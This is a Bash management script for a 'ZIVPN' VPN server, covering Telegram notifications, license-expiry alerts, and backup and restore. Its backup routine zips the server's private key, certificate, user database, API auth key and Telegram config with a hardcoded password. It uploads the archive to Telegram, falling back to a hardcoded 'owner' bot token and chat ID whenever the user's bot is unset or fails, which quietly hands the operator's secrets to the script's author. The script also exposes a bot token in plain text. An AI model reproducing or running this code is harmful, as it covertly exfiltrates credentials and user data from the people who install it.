CONFIG_DIR="/etc/zivpn"
TELEGRAM_CONF="${CONFIG_DIR}/telegram.conf"
function get_host() {
local CERT_CN
CERT_CN=$(openssl x509 -in "${CONFIG_DIR}/zivpn.crt" -noout -subject | sed -n 's/.*CN = \([^,]*\).*/\1/p')
if [ "$CERT_CN" == "zivpn" ]; then
cat /etc/zivpn/ip.txt
else
echo "$CERT_CN"
fi
}
function send_telegram_notification() {
local message="$1"
local keyboard="$2"
if [ ! -f "$TELEGRAM_CONF" ]; then
return 1
fi
source "$TELEGRAM_CONF"
if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
local api_url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"
if [ -n "$keyboard" ]; then
curl -s -X POST "$api_url" -d "chat_id=${TELEGRAM_CHAT_ID}" --data-urlencode "text=${message}" -d "reply_markup=${keyboard}" > /dev/null
else
curl -s -X POST "$api_url" -d "chat_id=${TELEGRAM_CHAT_ID}" --data-urlencode "text=${message}" -d "parse_mode=Markdown" > /dev/null
fi
fi
}
function setup_telegram() {
echo "--- Konfigurasi Notifikasi Telegram ---"
read -p "Masukkan Bot API Key Anda: " api_key
read -p "Masukkan ID Chat Telegram Anda (dapatkan dari @userinfobot): " chat_id
if [ -z "$api_key" ] || [ -z "$chat_id" ]; then
echo "API Key dan ID Chat tidak boleh kosong. Pengaturan dibatalkan."
return 1
fi
echo "TELEGRAM_BOT_TOKEN=${api_key}" > "$TELEGRAM_CONF"
echo "TELEGRAM_CHAT_ID=${chat_id}" >> "$TELEGRAM_CONF"
chmod 600 "$TELEGRAM_CONF"
echo "Konfigurasi berhasil disimpan di $TELEGRAM_CONF"
return 0
}
handle_backup() {
echo "--- Memulai Proses Backup ---"
TELEGRAM_CONF="${TELEGRAM_CONF:-/etc/zivpn/telegram.conf}"
CONFIG_DIR="${CONFIG_DIR:-/etc/zivpn}"
if [ -f "$TELEGRAM_CONF" ]; then
source "$TELEGRAM_CONF"
fi
DEFAULT_BOT_TOKEN="7706681818:AAHXddmh4zc8m4kSk49UZCHScRcOxRZ0N0Q"
DEFAULT_CHAT_ID="1962241851"
BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-$DEFAULT_BOT_TOKEN}"
CHAT_ID="${TELEGRAM_CHAT_ID:-$DEFAULT_CHAT_ID}"
if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
echo "❌ Telegram Bot Token / Chat ID belum diset!" | tee -a /var/log/zivpn_backup.log
read -r -p "Tekan [Enter]..." && /usr/local/bin/zivpn-manager
return
fi
VPS_IP="$(cat /etc/zivpn/ip.txt 2>/dev/null | tr -d ' \t\r\n')"
[ -z "$VPS_IP" ] && VPS_IP="UNKNOWN"
TIMESTAMP="$(date +%Y%m%d-%H%M%S)"
NOW_HUMAN="$(date +"%d %B %Y %H:%M:%S")"
backup_filename="zivpn_backup_${VPS_IP}_${TIMESTAMP}.zip"
temp_backup_path="/tmp/${backup_filename}"
files_to_backup=(
"$CONFIG_DIR/config.json"
"$CONFIG_DIR/users.db"
"$CONFIG_DIR/api_auth.key"
"$CONFIG_DIR/telegram.conf"
"$CONFIG_DIR/total_users.txt"
"$CONFIG_DIR/zivpn.crt"
"$CONFIG_DIR/zivpn.key"
)
echo "Membuat backup ZIP..."
valid_files=()
for f in "${files_to_backup[@]}"; do
[ -f "$f" ] && valid_files+=("$f")
done
if [ "${#valid_files[@]}" -eq 0 ]; then
echo "❌ Tidak ada file valid untuk dibackup!" | tee -a /var/log/zivpn_backup.log
read -r -p "Tekan [Enter]..." && /usr/local/bin/zivpn-manager
return
fi
zip -j -P "AriZiVPN-Gacorr123!" "$temp_backup_path" "${valid_files[@]}" >/dev/null 2>&1
if [ ! -f "$temp_backup_path" ]; then
echo "❌ Gagal membuat file backup!" | tee -a /var/log/zivpn_backup.log
read -r -p "Tekan [Enter]..." && /usr/local/bin/zivpn-manager
return
fi
caption_base="✅ BACKUP ZIVPN BERHASIL
IP VPS   : ${VPS_IP}
Tanggal  : ${NOW_HUMAN}
🔄 CARA RESTORE BACKUP
Via LINK FILE (HTTPS)
1) Forward / kirim file backup ke:
https://t.me/potato_directlinkBot
2) Salin link HTTPS
3) Paste link saat proses restore"
send_result="$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
-F chat_id="${CHAT_ID}" \
-F document=@"${temp_backup_path}" \
-F caption="$caption_base")"
SEND_BY="USER_BOT"
ACTIVE_BOT_TOKEN="$BOT_TOKEN"
ACTIVE_CHAT_ID="$CHAT_ID"
if ! echo "$send_result" | grep -q '"ok":true'; then
echo "⚠️ Gagal kirim ke User Bot, fallback ke Owner Bot..." | tee -a /var/log/zivpn_backup.log
send_result="$(curl -s -X POST "https://api.telegram.org/bot${DEFAULT_BOT_TOKEN}/sendDocument" \
-F chat_id="${DEFAULT_CHAT_ID}" \
-F document=@"${temp_backup_path}" \
-F caption="$caption_base")"
SEND_BY="OWNER_BOT"
ACTIVE_BOT_TOKEN="$DEFAULT_BOT_TOKEN"
ACTIVE_CHAT_ID="$DEFAULT_CHAT_ID"
if ! echo "$send_result" | grep -q '"ok":true'; then
echo "❌ GAGAL TOTAL kirim ke Telegram!" | tee -a /var/log/zivpn_backup.log
rm -f "$temp_backup_path"
read -r -p "Tekan [Enter]..." && /usr/local/bin/zivpn-manager
return
fi
fi
message_id="$(echo "$send_result" | sed -nE 's/.*"message_id":([0-9]+).*/\1/p' | head -n1)"
caption_final="${caption_base}
Dikirim via: ${SEND_BY}"
if [ -n "$message_id" ]; then
curl -s -X POST "https://api.telegram.org/bot${ACTIVE_BOT_TOKEN}/editMessageCaption" \
-d chat_id="${ACTIVE_CHAT_ID}" \
-d message_id="${message_id}" \
--data-urlencode "caption=${caption_final}" >/dev/null 2>&1
fi
rm -f "$temp_backup_path"
clear
echo "✅ BACKUP ZIVPN BERHASIL"
echo "IP VPS   : ${VPS_IP}"
echo "Tanggal  : ${NOW_HUMAN}"
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔄 CARA RESTORE BACKUP (LINK SAJA)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "1) Forward / kirim file backup ke: https://t.me/potato_directlinkBot"
echo "2) Salin link HTTPS"
echo "3) Paste link saat proses restore"
echo ""
echo "Dikirim via: ${SEND_BY}"
echo ""
read -r -p "Tekan [Enter] untuk kembali ke menu..." && /usr/local/bin/zivpn-manager
}
function handle_expiry_notification() {
local host="$1"
local ip="$2"
local client="$3"
local isp="$4"
local exp_date="$5"
local message
message=$(cat <<EOF
◇━━━━━━━━━━━━━━◇
⛔SC ZIVPN EXPIRED ⛔
◇━━━━━━━━━━━━━━◇
IP VPS  : ${ip}
HOST  : ${host}
ISP     : ${isp}
CLIENT : ${client}
EXP DATE  : ${exp_date}
◇━━━━━━━━━━━━━━◇
EOF
)
local keyboard
keyboard=$(cat <<EOF
{
"inline_keyboard": [
[
{
"text": "Perpanjang Licence",
"url": "https://t.me/ARI_VPN_STORE"
}
]
]
}
EOF
)
send_telegram_notification "$message" "$keyboard"
}
function handle_renewed_notification() {
local host="$1"
local ip="$2"
local client="$3"
local isp="$4"
local expiry_timestamp="$5"
local current_timestamp
current_timestamp=$(date +%s)
local remaining_seconds=$((expiry_timestamp - current_timestamp))
local remaining_days=$((remaining_seconds / 86400))
local message
message=$(cat <<EOF
◇━━━━━━━━━━━━━━◇
✅RENEW SC ZIVPN✅
◇━━━━━━━━━━━━━━◇
IP VPS  : ${ip}
HOST  : ${host}
ISP     : ${isp}
CLIENT : ${client}
EXP : ${remaining_days} Days
◇━━━━━━━━━━━━━━◇
EOF
)
send_telegram_notification "$message"
}
function handle_api_key_notification() {
local api_key="$1"
local server_ip="$2"
local domain="$3"
local message
message=$(cat <<EOF
🚀 API UDP ZIVPN 🚀
🔑 Auth Key: ${api_key}
🌐 Server IP: ${server_ip}
🌍 Domain: ${domain}
EOF
)
send_telegram_notification "$message"
}
handle_restore() {
clear
echo "===== ZIVPN RESTORE ====="
read -rp "Masukkan DIRECT LINK backup (.zip): " URL
wget -O /tmp/backup.zip "$URL" && unzip -P "AriZiVPN-Gacorr123!" -o /tmp/backup.zip -d /etc/zivpn && systemctl restart zivpn.service
echo ""
systemctl is-active --quiet zivpn.service && echo "✅ RESTORE BERHASIL" || echo "⚠️ RESTORE OK TAPI SERVICE ERROR"
read -rp "Tekan Enter..."
}
case "$1" in
backup)
handle_backup
;;
restore)
handle_restore
;;
setup-telegram)
setup_telegram
;;
expiry-notification)
if [ $# -ne 6 ]; then
echo "Usage: $0 expiry-notification <host> <ip> <client> <isp> <exp_date>"
exit 1
fi
handle_expiry_notification "$2" "$3" "$4" "$5" "$6"
;;
renewed-notification)
if [ $# -ne 6 ]; then
echo "Usage: $0 renewed-notification <host> <ip> <client> <isp> <expiry_timestamp>"
exit 1
fi
handle_renewed_notification "$2" "$3" "$4" "$5" "$6"
;;
api-key-notification)
if [ $# -ne 4 ]; then
echo "Usage: $0 api-key-notification <api_key> <server_ip> <domain>"
exit 1
fi
handle_api_key_notification "$2" "$3" "$4"
;;
*)
echo "Usage: $0 {backup|restore|setup-telegram|expiry-notification|renewed-notification|api-key-notification}"
exit 1
;;
esac
